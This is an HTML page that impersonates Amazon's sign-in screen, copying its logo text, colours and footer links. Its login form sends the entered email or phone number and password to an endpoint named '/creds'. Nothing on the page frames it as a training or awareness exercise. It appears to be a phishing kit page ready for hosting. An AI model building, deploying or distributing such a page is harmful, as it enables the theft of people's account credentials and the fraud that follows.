<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon Sign In</title>
    <style>
        body { font-family: Arial, sans-serif; background: #fff; margin: 0; padding: 20px; }
        .container { max-width: 350px; margin: 0 auto; }
        .logo { text-align: center; margin-bottom: 20px; }
        .logo span { font-size: 28px; color: #131921; }
        .card { border: 1px solid #ddd; border-radius: 8px; padding: 20px; }
        h1 { font-size: 22px; margin-bottom: 15px; }
        label { display: block; font-size: 13px; margin-bottom: 5px; }
        input { width: 100%; padding: 8px; margin-bottom: 15px; border: 1px solid #a6a6a6; border-radius: 3px; box-sizing: border-box; }
        button { width: 100%; padding: 10px; background: #f0c14b; border: 1px solid #a88734; border-radius: 3px; cursor: pointer; }
        .footer { text-align: center; margin-top: 15px; font-size: 12px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo"><span>amazon</span></div>
        <div class="card">
            <h1>Sign-In</h1>
            <form action="/creds" method="POST">
                <label>Email or mobile phone number</label>
                <input type="text" name="email" required>
                <label>Password</label>
                <input type="password" name="password" required>
                <button type="submit">Sign-In</button>
            </form>
        </div>
        <div class="footer">Conditions of Use Â· Privacy Notice</div>
    </div>
</body>
</html>
